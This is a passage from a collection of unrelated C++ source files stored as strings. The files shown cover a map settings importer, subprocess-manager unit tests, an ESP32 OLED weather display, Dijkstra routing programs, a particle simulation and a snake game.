pInfo->m_Settings;\n\t\t\t\t\tchar *pMapSettings = (char *)Reader.GetData(SettingsIndex);\n\t\t\t\t\tint DataSize = Reader.GetDataSize(SettingsIndex);\n\t\t\t\t\tif(DataSize == TotalLength && mem_comp(pSettings, pMapSettings, DataSize) == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tdbg_msg(\"config_store\", \"configs coincide, not updating map\");\n\t\t\t\t\t\tfree(pSettings);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tReader.UnloadData(pInfo->m_Settings);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tMapInfo = *pInfo;\n\t\t\t\t\tMapInfo.m_Settings = SettingsIndex;\n\t\t\t\t\tpData = (int *)&MapInfo;\n\t\t\t\t\tSize = sizeof(MapInfo);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t*(CMapItemInfo *)&MapInfo = *(CMapItemInfo *)pInfo;\n\t\t\t\tMapInfo.m_Settings = SettingsIndex;\n\t\t\t\tpData = (int *)&MapInfo;\n\t\t\t\tSize = sizeof(MapInfo);\n\t\t\t}\n\t\t}\n\t\tWriter.AddItem(TypeID, ItemID, Size, pData);\n\t}\n\n\tif(!FoundInfo)\n\t{\n\t\tCMapItemInfoSettings Info;\n\t\tInfo.m_Version = 1;\n\t\tInfo.m_Author = -1;\n\t\tInfo.m_MapVersion = -1;\n\t\tInfo.m_Credits = -1;\n\t\tInfo.m_License = -1;\n\t\tInfo.m_Settings = SettingsIndex;\n\t\tWriter.AddItem(MAPITEMTYPE_INFO, 0, sizeof(Info), &Info);\n\t}\n\n\tfor(int i = 0; i < Reader.NumData() || i == SettingsIndex; i++)\n\t{\n\t\tif(i == SettingsIndex)\n\t\t{\n\t\t\tWriter.AddData(TotalLength, pSettings);\n\t\t\tcontinue;\n\t\t}\n\t\tunsigned char *pData = (unsigned char *)Reader.GetData(i);\n\t\tint Size = Reader.GetDataSize(i);\n\t\tWriter.AddData(Size, pData);\n\t\tReader.UnloadData(i);\n\t}\n\n\tfree(pSettings);\n\tReader.Close();\n\tif(!Writer.OpenFile(pStorage, pMapName))\n\t{\n\t\tdbg_msg(\"config_store\", \"couldn't open map file '%s' for writing\", pMapName);\n\t\treturn;\n\t}\n\tWriter.Finish();\n\tdbg_msg(\"config_store\", \"imported settings\");\n}\n#include \"config_common.h\"\n",
    "#include <stdexcept>\n#include <subprocess_manager.h>\n#include <format>\n#include <iostream>\n#include \"utest.h\"\nusing namespace subprocess_manager;\nstd::string get_exe_path(){\n    char buffer[MAX_PATH];\n    GetModuleFileName(NULL, buffer, MAX_PATH);\n    return std::string(buffer);\n}\n\nstd::string get_time(){\n    time_t _time = time(NULL);\n    struct tm _tm = *localtime(&_time);\n    char message[100];\n    sprintf(message,\"%d-%02d-%02d %02d:%02d:%02d\",\n        _tm.tm_year + 1900,\n        _tm.tm_mon  + 1,\n        _tm.tm_mday,\n        _tm.tm_hour,\n        _tm.tm_min,\n        _tm.tm_sec\n    );\n    return std::string(message);\n}\nUTEST(Task, Task)\n{\n    for(int i=0;i<10;i++){  // run 10 times\n        std::cout << get_time() << std::endl;\n        Sleep(100); // sleep for 100ms\n    }\n    EXPECT_EQ(0, 0);\n}\nstd::string task_name = \"TestName\";\nstd::string task_cmd = std::format(\"{0} --filter=Task.Task\",get_exe_path());\nUTEST(Subprocess, SingleProcess)\n{\n    Subprocess *process1 = new Subprocess(task_name,task_cmd);\n    process1->start();\n    EXPECT_EQ(process1->m_return_code, 0);\n    delete process1;\n    \n    EXPECT_EXCEPTION(Subprocess(task_name,\"invalid.exe 1 20 30\").start(), std::runtime_error);\n    \n}\nUTEST(Subprocess, SingleProcessWithLog)\n{\n    Subprocess *process1 = new Subprocess(task_name,task_cmd,\"\",\"log.txt\");\n    process1->start();\n    EXPECT_EQ(process1->m_return_code, 0);\n    process1->join();\n    process1->terminate();\n    delete process1;\n}\nUTEST(Subprocess, TwoProcess)\n{\n    Subprocess *process1 = new Subprocess(task_name, task_cmd);\n    Subprocess *process2 = new Subprocess(task_name, task_cmd);\n    process1->start_async();\n    process2->start_async();\n    EXPECT_EXCEPTION(process1->start(), std::runtime_error);\n    while(true){\n        bool process1_active = process1->m_state == Subprocess_Completed;\n        bool process2_active = process2->m_state == Subprocess_Completed;\n        if(!process1_active && !process2_active){\n            break;\n        }\n    }\n    \n    EXPECT_EQ(process1->m_return_code, -1);\n    EXPECT_EQ(process2->m_return_code, -1);\n    delete process1;\n    delete process2;\n}\n\nUTEST(Subprocess, InvalidTaskPath)\n{\n    Subprocess *process1 = new Subprocess(task_name, \"invalidname.exe 1 100 1\");\n    EXPECT_EXCEPTION({process1->start();},std::runtime_error);\n}\n\nUTEST(SubprocessManager, SingleProcess)\n{\n    SubprocessManager manager;\n    manager.add(\"task1\", task_cmd);\n    manager.start();\n    EXPECT_EQ(manager[\"task1\"]->m_return_code, 0);\n    manager.join();\n    manager.terminate();\n}\nUTEST(SubprocessManager, TwoProcess)\n{\n    SubprocessManager manager;\n    manager.add(\"task1\", task_cmd);\n    Subprocess* task2 = new Subprocess(task_name,task_cmd);\n    manager.add(task2);\n    EXPECT_EXCEPTION(manager.add(nullptr),std::runtime_error);\n    EXPECT_EXCEPTION(manager.add(\"task1\", task_cmd),std::runtime_error);\n    manager.start_async();\n    EXPECT_EXCEPTION(manager.start_async(), std::runtime_error);\n    while(manager.m_state != Subprocess_Completed);\n    EXPECT_EQ(manager[\"task1\"]->m_return_code, 0);\n    EXPECT_EQ(manager[\"TestName\"]->m_return_code, 0);\n    EXPECT_EXCEPTION(manager[\"invalid\"],std::runtime_error);\n    manager.join();\n    manager.terminate();\n}\nUTEST(SubprocessManager, InvalidTask)\n{\n    SubprocessManager manager;\n    manager.add(\"task1\", \"invalidname.exe 1 100 1\");\n    EXPECT_EXCEPTION({manager.start();},std::runtime_error);\n    SubprocessManager manager2;\n    manager2.terminate();\n}\n\nUTEST(SubprocessManager, DuplicateTask)\n{\n    SubprocessManager manager;\n    manager.add(\"task1\", task_cmd);\n    EXPECT_EXCEPTION({manager.add(\"task1\", task_cmd);},std::runtime_error);\n}\n\nUTEST_MAIN();",
    "#include <WiFi.h>\n#include <SPI.h>\n#include <NTPClient.h>\n#include <WiFiUdp.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <DHT.h>\n#define SCREEN_WIDTH 128 // OLED display width, in pixels\n#define SCREEN_HEIGHT 64 // OLED display height, in pixels\n#define ANALOG_PIN D1      // Analog pin connected to the voltage divider\n#define ADC_MAX 4095      // 12-bit ADC\n#define REF_VOLTAGE 2.8   // Reference voltage of ADC (3.3V for Xiao ESP32C3)\n// WiFi credentials\nconst char* ssid     = \"FreeWiFi\";//your ssid\nconst char* password = \"JustKiddingNoway!\";//your wifi password \n// OLED display SPI pins\n#define OLED_MOSI    D10\n#define OLED_CLK     D8\n#define OLED_DC      D4\n#define OLED_CS      D7\n#define OLED_RESET   D5\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT,\n  OLED_MOSI, OLED_CLK, OLED_DC, OLED_RESET, OLED_CS);\n#define DHTPIN D0\n#define DHTTYPE    DHT11\nDHT dht(DHTPIN, DHTTYPE);\n// NTP client to get time\nWiFiUDP ntpUDP;\nNTPClient timeClient(ntpUDP, \"pool.ntp.org\", 19800, 0);\n//bit ui bitmap\nstatic const unsigned char PROGMEM image_paint_1_bits[] = {0x60,0xf0,0x90,0x90,0x90,0x90,0xf0};\nstatic const unsigned char PROGMEM image_paint_0_bits[] = {0x7e,0x3f,0x3f,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xfc,0xfc,0x7e,0xc1,0x3e,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x7c,0x83,0xd5,0x3c,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x3c,0xab,0xd5,0x39,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0xab,0xd5,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0xab,0x95,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x24,0xa9,0x25,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0xa4,0x49,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x92,0x93,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0xc9,0xa6,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x65,0xac,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x35,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x15,0xa8,0x26,0x04,0x92,0x48,0x3f,0xff,0xff,0xff,0xff,0xfc,0x12,0x49,0x20,0x64,0x15,0x88,0x29,0x09,0x24,0x90,0x7f,0xff,0xff,0xff,0xff,0xfe,0x09,0x24,0x90,0x94,0x11,0xa8,0x29,0x12,0x49,0x20,0xf0,0x00,0x00,0x00,0x00,0x0f,0x04,0x92,0x48,0x94,0x15,0x88,0x26,0x24,0x92,0x41,0xe0,0x00,0x00,0x00,0x00,0x07,0x82,0x49,0x24,0x64,0x11,0xa8,0x10,0x00,0x00,0x03,0xff,0xff,0xff,0xff,0xff,0xff,0xc0,0x00,0x00,0x08,0x15,0x88,0x0f,0xff,0xff,0xfc,0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0xff,0xff,0xf0,0x11,0xa8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0xa8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0xa8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0xa8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0xa8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0",
    "#include <iostream>\n#include <cstdlib> // For rand()\n\n#include \"map.h\"\n#include \"randomWalker.h\" //For random walk\n#include \"fileHandler.h\"  //For handelling files\n\nusing namespace std;\n\nvoid randomPath(const Graph& graph, int StartNode, int EndNode, FileHandler& file, int serialNo)\n{\n\n    // Test Dijkstra's algorithm performance\n    auto start = chrono::high_resolution_clock::now();\n    struct return_value result = Dijkstra(graph, StartNode, EndNode);\n    auto end = chrono::high_resolution_clock::now();\n\n    chrono::duration<double> duration = end - start;\n\n    //printing the results into a csv file\n    stringstream data;\n    data << serialNo << \",\" << file.decodeLocation(StartNode) << \",\" << file.decodeLocation(EndNode) << \",\" << result.distance << \",\" << duration.count();\n    file.writeInCSV(data.str());\n\n    //printing the results\n    cout << \"Distance between \" << file.decodeLocation(StartNode) << \" and \" << file.decodeLocation(EndNode) << \" is \" << result.distance<<endl;\n    cout << \"Dijkstra's algorithm took \" << duration.count() << \" seconds.\\n\";\n}\n\nvoid dijkstraShortestPath(const Graph& graph, int StartNode, int EndNode, FileHandler& file)\n{\n\n    // Test Dijkstra's algorithm performance\n    auto start = chrono::high_resolution_clock::now();\n    struct return_value result = Dijkstra(graph, StartNode, EndNode);\n    auto end = chrono::high_resolution_clock::now();\n\n    chrono::duration<double> duration = end - start;\n\n    //printing the results\n    cout << \"Distance between \" << file.decodeLocation(StartNode) << \" and \" << file.decodeLocation(EndNode) << \" is \" << result.distance<<endl;\n    cout << \"Dijkstra's algorithm took \" << duration.count() << \" seconds.\\n\";\n    cout << \"The path from source to destination is ::\\n\";\n    //printPath(result.parent, file, StartNode, EndNode);\n    vector<int> path = retrievePath(result.parent, StartNode, EndNode);\n    // Print the retrieved path\n    cout << \"Path from \" << file.decodeLocation(StartNode) << \" to \" << file.decodeLocation(EndNode) << \": \";\n    for (int node : path) {\n        cout << file.decodeLocation(node) << \"->\";\n    }\n}\n\n\nint main()\n{\n    //! handel the files names and the inputs needed to run the program\n    string verticesFile = \"Bhubaneswar.csv\";\n    int nodesCount = 41;\n    string locationFile = \"locations.csv\";\n    // Load graph from CSV files\n    FileHandler file(locationFile);\n    Graph graph = file.loadGraphFromCSV(verticesFile, nodesCount);\n\n    while (true)\n    {\n        cout << \"\\n=== Dynamic Vehicle Routing ===\\n\";\n        cout << \"1. Run Random Walker\\n\";\n        cout << \"2. Find Shortest Path\\n\";\n        cout << \"3. Exit\\n\";\n\n        cout << \"Select an option (1/2/3): \";\n        int choice;\n        cin >> choice;\n\n        if (choice == 1) {\n            string source, destination;\n            cout << \"Enter the source: \";\n            cin.ignore();\n            getline(cin, source);\n            cout << \"Enter the destination: \";\n            //scanf(\"%[^\\n]\", &destination);\n            getline(cin, destination);\n            int iterate;\n            cout << \"Enter the number of random walks to be performed: \";\n            cin >> iterate;\n\n            file.writeInCSV(\"Sl No,Source,Destination,Distance,Execution Time\");\n\n            int sourceID = file.encodeLocation(source);\n            int destinationID = file.encodeLocation(destination);\n            for (int i = 0; i < iterate; i++)\n            {\n                cout << \"================================================================================\"<<endl;\n                int newSource = runRandomWalker(graph, sourceID);\n                if (newSource == -1) {\n                    cout << \"Random Walker is stuck at vertex \" << file.decodeLocation(sourceID) << \".\\n\";\n                    break;\n                }\n                else {\n                    cout << \"Random Walker moves from \" << file.decodeLocation(sourceID) << \" to \" << file.decodeLocation(newSource) << endl;\n                }\n                randomPath(graph, newSource, destinationID, file, i);\n                sourceID = newSource;\n                cout << \"================================================================================\"<<endl;\n            }\n        }\n        else if (choice == 2) {\n            string source, destination;\n            cout << \"Enter the source: \";\n            cin.ignore();\n            getline(cin, source);\n            cout << \"Enter the destination: \";\n            getline(cin, destination);\n            int sourceID = file.encodeLocation(source);\n            int destinationID = file.encodeLocation(destination);\n            /*cout << \"lets go from \" << sourceID << \" to \" << destinationID<<endl;*/\n            dijkstraShortestPath(graph, sourceID, destinationID, file);\n        }\n        else if (choice == 3) {\n            cout << \"Exiting the program. Goodbye!\\n\";\n            return 0;\n        }\n        else {\n            cout << \"Invalid choice. Please enter 1, 2, or 3.\\n\";\n        }\n    }\n\n    ",
    "#include \"simulation.hpp\"\n#include <iostream>\n#include <vector>\n#include <cmath>\n#include <array>\n#include <string>\n#include <fstream>\n\n// \u89d2\u5ea6\u4f9d\u5b58\u6027\u95a2\u6570\ndouble P(double cos_theta) {\n    return 0.5 * (1 + cos_theta);\n}\n\n// \u529b\u95a2\u6570\ndouble V(double r, double c) {\n    return std::tanh(r - c) + std::tanh(c);\n}\n\n// \u4f4d\u7f6e\u3068\u901f\u5ea6\u306e\u66f4\u65b0\u95a2\u6570\nvoid update(Values& positions, \n            Values& velocities, \n            Values& accelerations, \n            double dt, \n            NeighborIds neighbors, \n            double a, \n            double c,\n            int num,\n            double width,\n            double height) {\n    Values new_accelerations(num, {0.0, 0.0});\n\n    for (int n = 0; n < num; ++n) {\n        std::array<double, 2> force_sum = {0.0, 0.0};\n\n        for (int m : neighbors[n]) {\n            double rmn = std::sqrt(std::pow(positions[n][0] - positions[m][0], 2) + \n                                   std::pow(positions[n][1] - positions[m][1], 2));\n            if (rmn == 0) continue;\n\n            double dot_product = velocities[n][0] * velocities[m][0] + velocities[n][1] * velocities[m][1];\n            double norms_product = std::sqrt(velocities[n][0] * velocities[n][0] + velocities[n][1] * velocities[n][1]) * \n                                   std::sqrt(velocities[m][0] * velocities[m][0] + velocities[m][1] * velocities[m][1]);\n            if (norms_product == 0) continue;\n\n            double cos_theta = dot_product / norms_product;\n\n            force_sum[0] += P(cos_theta) * V(rmn, c) ;\n            force_sum[1] += P(cos_theta) * V(rmn, c) ;\n\n            force_sum[0] -= velocities[n][0];\n            force_sum[1] -= velocities[n][1];\n        }\n\n        new_accelerations[n][0] += a * force_sum[0];\n        new_accelerations[n][1] += a * force_sum[1];\n\n        velocities[n][0] += new_accelerations[n][0] * dt;\n        velocities[n][1] += new_accelerations[n][1] * dt;\n\n        positions[n][0] += velocities[n][0] * dt;\n        positions[n][1] += velocities[n][1] * dt;\n\n        accelerations[n][0] = new_accelerations[n][0];\n        accelerations[n][1] = new_accelerations[n][1];\n\n        if (positions[n][0] >= width) {\n            positions[n][0] -= width;\n        }\n        else if (positions[n][0] < 0) {\n            positions[n][0] += width;         \n        }\n\n        if (positions[n][1] >= height) {\n            positions[n][1] = height - (positions[n][1]-height);\n            velocities[n][1] *= -1;         \n        }\n        else if (positions[n][1] < 0) {\n            positions[n][1] = -positions[n][1];\n            velocities[n][1] = -velocities[n][1];         \n        }\n\n        if (positions[n][0] > width) {\n            std::cerr << \"Error: Particle \" << n << \" exceeded width: \"\n                      << positions[n][0] << \" > \" << width << std::endl;\n            throw std::out_of_range(\"Particle exceeded width boundary\");\n        } else if (positions[n][1] > height) {\n            std::cerr << \"Error: Particle \" << n << \" exceeded height: \"\n                      << positions[n][1] << \" > \" << height << std::endl;\n            throw std::out_of_range(\"Particle exceeded height boundary\");\n        }\n    }\n}\n\nNeighborIds find_neighbors(int num, const Values& positions, double distance_threshold) {\n\n    NeighborIds neighbors(num);  \n\n    for (int n = 0; n < num; ++n) {\n        for (int m = 0; m < num; ++m) {\n            if (n != m) {\n                double distance = std::sqrt(std::pow(positions[n][0] - positions[m][0], 2) + \n                                            std::pow(positions[n][1] - positions[m][1], 2));\n                if (distance <= distance_threshold) {\n                    neighbors[n].push_back(m);  \n                }\n            }\n        }\n    }\n    return neighbors;\n}\n\nvoid run_simulation(Values &positions,\n                    Values &velocities,\n                    Values &accelerations,\n                    double distance_threshold,\n                    int steps,\n                    int num,\n                    double r,\n                    double dt,\n                    double a,\n                    double c,\n                    double width,\n                    double height,\n                    std::string filepath){\n    auto neighbors = find_neighbors(num, positions, distance_threshold);\n\n    std::ofstream ofs_csv_file(filepath);\n\n    if (!ofs_csv_file.is_open()) {\n        std::cerr << \"Error opening file: \" << filepath << std::endl;\n        return;\n    }\n\n    for (int i = 0; i < steps; ++i){\n        update(positions, velocities, accelerations, dt, neighbors, a, c, num, width, height);\n\n        if (i % 20 == 0) {\n            if (ofs_csv_file.is_open()) {\n                for (int j = 0; j < num; ++j) {\n                    ofs_csv_file << positions[j][0] << \",\" << positions[j][1] << std::endl;\n                }\n            }\n        }\n    }\n}",
    "/**\n * @file shortest.cpp\n * @author Griffin Nye\n * @brief CSC402 Dr. Spiegel Spring 2020- Constructs a graph using an adjacency list given \n *        from an input file then computes the minimum cost path from the first vertex for each \n *        vertex in the graph using Djikstra's algorithm, before outputting the graph, the minimum\n *        cost paths for each vertex along with their costs, and the number of microseconds it took\n *        to compute.\n * Due Date: 2/28/20\n * Assignment: #2\n */\n\n#include <chrono>\n#include <climits>\n#include <iomanip>\n#include <iostream>\n#include <fstream>\n#include <map>\n#include <sstream>\n#include <string>\n#include <stdlib.h>\n#include <queue>\n#include <vector>\n\nusing namespace std;\n\nstruct Node {\npublic:\n\n\t/**getVal:\n\t * @brief Retrieves the value of Node.val\n\t * @return val the value stored in Node.val\n\t */\n\tint getVal() const {\n\t\treturn val;\n\t}//end getVal\n\n\t/**getCost:\n\t * @brief Retrieves the value of Node.cost\n\t * @return cost the value stored in Node.cost\n\t */\n\tint getCost() const {\n\t\treturn cost;\n\t}//end getCost\n\n\t/**setVal:\n\t * @brief Sets the identifier for the recipient vertex of a directed edge\n\t * @param vertex identifier for the recipient vertex of a directed edge\n\t */\n\tvoid setVal(int vertex) {\n\t\tval = vertex;\n\t}//end setVal\n\n\t/**setCost:\n\t * @brief Sets the cost to traverse edge directed to Node.val\n\t * @param weight the cost/weight to traverse edge directed to Node.val\n\t */\n\tvoid setCost(int weight) {\n\t\tcost = weight;\n\t}//end setCost\n\nprivate:\n\tint val;\n\tint cost;\n};//end Node\n\nclass nodeComparison {\npublic:\n  /**operator()\n\t * @param n1 the node to the left of the comparison operator\n\t * @param n2 the node to the right of the comparison operator\n\t */\n  bool operator() (const Node& n1, const Node& n2) {\n\t\treturn (n1.getCost() > n2.getCost());\n\t}//end operator()\n};//end nodeComparison\n\n//Function Prototypes\n/**clearScreen:\n * @brief Clears the contents of the screen for improved readability.\n */\nvoid clearScreen();\n\n/**getInFile:\n * @brief Prompts the user for the input filename and returns the given string\n * @return filename the provided filename\n */\nstring getInFile();\n\n/**getOutFile:\n * @brief Prompts the user for the output filename and returns the given string\n * @return filename the provided filename\n */\nstring getOutFile();\n\n/**openFile:\n * @brief Attempts to open the file, returning error message upon failure\n * @param file filestream used to open the file- INPUT/OUTPUT\n * @param filename the name of the file to open- INPUT\n * @return fileOpen true = success, false = failure\n */\nbool openFile(ifstream& file, const string filename);\n\n/**getNumNodes:\n * @brief Retrieves the number of nodes from the file\n * @param file the input stream for the file- INPUT/OUTPUT\n * @return int(line) the number of nodes\n */\nint getNumNodes(ifstream& file);\n\n/**fillAdjList:\n * @brief Fills the adjacency list using the input text file\n * @param file the input stream for the file- INPUT/OUTPUT\n * @param adj the adjacency list- INPUT/OUTPUT\n * @return start the current time in microseconds at commencement of algorithm\n */\nchrono::time_point< chrono::high_resolution_clock > \n\tfillAdjList(ifstream& file, multimap<int, Node>& adj);\n\n/**printAdjList:\n * @brief Prints the contents of the adjacency list\n * @param adj the adjacency list- INPUT\n */\nvoid printAdjList(const multimap<int, Node>& adj);\n\n/**findShortestPaths:\n * @brief Finds the shortest path from the source vertex to each vertex in the graph defaults and returns time of finish\n * @param adj the adjacency list- INPUT/OUTPUT\n * @param cost vector containing the cost of the shortest path for each vertex- INPUT/OUTPUT\n * @param num the number of vertices in the graph-INPUT\n * @param parent the array containing the parent of each vertex INPUT/OUTPUT\n * @return std::chrono::high_resolution_clock::now() current time in microseconds at completion of algorithm\n */\nchrono::time_point< chrono::high_resolution_clock >\n  findShortestPaths(multimap<int, Node>& adj, vector<int>& cost, int num, int parent[]);\n\n/**findShortestPathsHelper:\n * @brief Helper function for findShortestPaths, Retrieves the current vertex's neighbors and updates costs\n * @param adj the adjacency list- INPUT/OUTPUT\n * @param cost vector containing the cost of the shortest path for each vertex- INPUT/OUTPUT\n * @param marked the marked array (0=unmarked, 1=marked)- INPUT/OUTPUT\n * @param pq the priority_queue- INPUT/OUTPUT\n * @param currVertex the current vertex- INPUT\n * @param currCost the current cost- INPUT\n * @param parent the array containing the parent of each vertex- INPUT/OUTPUT\n */\nvoid findShortestPathsHelper(multimap<int, Node>& adj, vector<int>& cost, int* marked,\n\t\t\t\t\t\t\t priority_queue<Node, vector<Node>, nodeComparison>& pq, int currVertex, \n\t\t\t\t\t\t\t int currCost, int parent[]);\n\n/**initMarked\n * @brief Initalizes all vertices as unmarked(0) for Djikstra's\n * @param mark the marked array- INPUT/OUTPUT\n * @param num the number of vertices- INPUT\n *",
    "\r\n\r\n#include <graphics.h>\r\n#include \"snakeBody.h\"\r\n#include \"food.h\"\r\n\r\nint main()\r\n{\r\n    initwindow(800,510,\"SNAKE GAME\");\r\n    snakeBody body;\r\n    food fruit;\r\n    int length,count=0;\r\n    bool playing=true;\r\n    char lengtharr[3];\r\n    fruit.generate(body.getPosx(), body.getPosy());\r\n    int page=0;\r\n\r\n    while(1)\r\n    {\r\n            setactivepage(page);\r\n            setvisualpage(1-page);\r\n            cleardevice();\r\n            setcolor(BLUE);\r\n\r\n            setfillstyle(SOLID_FILL,RED);\r\n\r\n\r\n            if(GetAsyncKeyState(VK_LEFT))\r\n            {    body.changeDirTo(LEFT);    }\r\n            if(GetAsyncKeyState(VK_UP))\r\n            {    body.changeDirTo(UP);      }\r\n            if(GetAsyncKeyState(VK_RIGHT))\r\n            {    body.changeDirTo(RIGHT);   }\r\n            if(GetAsyncKeyState(VK_DOWN))\r\n            {    body.changeDirTo(DOWN);    }\r\n            if(GetAsyncKeyState(VK_ESCAPE))\r\n                  break;\r\n\r\n            if(playing==true && !body.update())\r\n            {\r\n                  playing = false;\r\n            }\r\n            body.drawSnake();\r\n\r\n\r\n            if(fruit.update(body.getPosx(), body.getPosy()))\r\n            {\r\n                 fruit.generate(body.getPosx(), body.getPosy());\r\n                 body.appendSnake();\r\n            }\r\n\r\n            // BOXES\r\n                 setcolor(BLUE);\r\n                 rectangle(0,0,30,510);\r\n                 rectangle(30,0,480,30);\r\n                 rectangle(480,0,510,510);\r\n                 rectangle(30,480,480,510);\r\n                 rectangle(510,0,800,20);\r\n                 rectangle(510,250,800,270);\r\n                 rectangle(780,20,800,250);\r\n                 rectangle(510,490,800,510);\r\n                 rectangle(780,270,800,490);\r\n                 setfillstyle(SOLID_FILL, BLUE);\r\n                 floodfill(15,250,BLUE);\r\n                 floodfill(250,15,BLUE);\r\n                 floodfill(495,250,BLUE);\r\n                 floodfill(250,495,BLUE);\r\n                 floodfill(550,260,BLUE);\r\n                 floodfill(550,10,BLUE);\r\n                 floodfill(790,150,BLUE);\r\n                 floodfill(550,500,BLUE);\r\n                 floodfill(790,300,BLUE);\r\n\r\n            // SCORE\r\n                 settextstyle(SANS_SERIF_FONT, HORIZ_DIR, 5);\r\n                 setcolor(GREEN);\r\n                 outtextxy(550, 70, \"LENGTH\");\r\n                 outtextxy(520, 130, \"ACHIEVED\");\r\n                 length = body.getlength();\r\n                 lengtharr[0]=char(48+length/10);\r\n                 lengtharr[1]=char(48+length%10);\r\n                 lengtharr[2]='\\0';\r\n                 outtextxy(620, 190, lengtharr);\r\n\r\n\r\n            // STATUS\r\n                 settextstyle(SANS_SERIF_FONT, HORIZ_DIR, 4);\r\n                 outtextxy(520, 300, \"STATUS :-\");\r\n                 if (body.getlength() == 30)\r\n                 {\r\n                      outtextxy(520, 350, \"YOU WON !\");\r\n                      playing=false;\r\n                 }\r\n                 else if(playing)\r\n                 {\r\n                      outtextxy(520, 350, \"PLAYING\");\r\n                 }\r\n                 else\r\n                 {\r\n                      outtextxy(520, 350, \"GAME OVER\");\r\n                 }\r\n                 settextstyle(SANS_SERIF_FONT, HORIZ_DIR, 2);\r\n                 outtextxy(520,400,\"PRESS 'ESC' to EXIT\");\r\n\r\n\r\n            